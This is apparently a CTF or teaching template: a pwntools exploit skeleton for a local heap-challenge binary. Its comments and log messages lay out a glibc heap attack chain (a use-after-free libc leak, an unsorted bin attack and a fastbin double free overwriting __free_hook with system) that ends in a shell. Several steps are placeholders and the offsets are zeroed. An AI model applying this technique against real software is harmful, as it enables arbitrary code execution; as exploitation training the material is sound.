from pwn import *
context.terminal = ['./gdbpwn-client.sh']

def create(p, index, size, data):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'Index:', index)
    p.sendlineafter(b'Size:', size)
    p.sendlineafter(b'Data:', data)

def delete(p, index):
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b'Index:', index)


def show(p, index):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'Index:', index)
    p.recvuntil(b'Data: ')
    return u64(p.recvline().rstrip().ljust(8, b'\x00'))

def edit(p, index, dat):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'Index:', index); time.sleep(0.2)
    p.sendline(dat)



def main():
    p = process('./fastbin')
    libc = ELF('./libc.so.6')

    gdb.attach(p)
    log.info(f'Setup leak block | create: idx=0; sz=512; dt=leak block'); time.sleep(0.2);
    # add function here
    
    log.info(f'Setup UAF block | create: idx=0; sz=100; dt=uaf block 1'); time.sleep(0.2);
    # add function here
    
    log.info(f'Setup UAF block | create: idx=0; sz=100; dt=uaf block 2'); time.sleep(0.2);
    # add function here
    
    log.info(f'Setup top block | create: idx=0; sz=16; dt=/bin/sh'); time.sleep(0.2);
    # add function here
    

    ### leak libc base
    log.info(f'Leaking address | delete: 0'); time.sleep(0.2);
    # add function here
    
    log.info(f'Now chunk contain data of fd & bk pointer')
    log.info(f'Cause after free it wont reset pointer to null so we can show it up to leak address')
    # main_arena + 88
    leak = show(p, b'0')
    log.info(f'leak: {hex(leak)}'); time.sleep(0.2)
    #pause()
    log.info(f'Use leak address to calculate address off function we want')

    # ======================== your modification here ============================
    leak_offset = 0
    free_hook_offset = 0
    system_offset = 0
    # ============================================================================

    libc.address = leak - leak_offset
    free_hook = libc.address + free_hook_offset
    system = libc.address + system_offset
    log.info(f'libc_base: {hex(libc.address)}'); time.sleep(0.2)
    log.info(f'&__free_hook: {hex(free_hook)}'); time.sleep(0.2)
    log.info(f'system: {hex(system)}')
    # for later double free

    ### unsorted bin attack to write a pointer to before free_hook for later fast bin attack
    log.info(f'Trigger unsorted bin block | edit: idx=0; dt= AAAAAAAA + __free_hook-0x10 | create: idx=0; sz=512; dt=trigger ub'); time.sleep(0.2);
    # put chunk into unsorted bin
    # uaf
    log.info(f'Edit block | edit: idx=0; dt= p64(0) + p64(free_hook-0x1d)'); time.sleep(0.2);
    # add function here
    
    # trigger unsorted bin attack
    log.info(f'Create block | create: idx=0; sz=512; dt="junk"'); time.sleep(0.2);
    # add function here
    
    log.info('Done writing to __free_hook + 0x10')



    ### write to __free_hook using double free (delete 1 -> delete 2 -> delete 1)
    # add function here

    log.info(f'Create block | create: idx=0; sz=100; dt= p64(free_hook-0x10)'); time.sleep(0.2);
    # add function here

    log.info(f'Create block | create: idx=0; sz=100; dt="junk"'); time.sleep(0.2);
    # add function here
    
    log.info(f'Create block | create: idx=0; sz=100; dt="junk"'); time.sleep(0.2);
    # add function here
    
    log.info(f'Create block | create: idx=0; sz=100; dt= p64(system)'); time.sleep(0.2);
    # add function here
    log.info('Done writing system to __free_hook')


    # spawn shell
    time.sleep(0.2)
    log.info('Enjoy shell~~~ hecked by iluvinn')
    pause()
    delete(p, b'3')
    p.interactive()


if __name__ == "__main__":
    main()



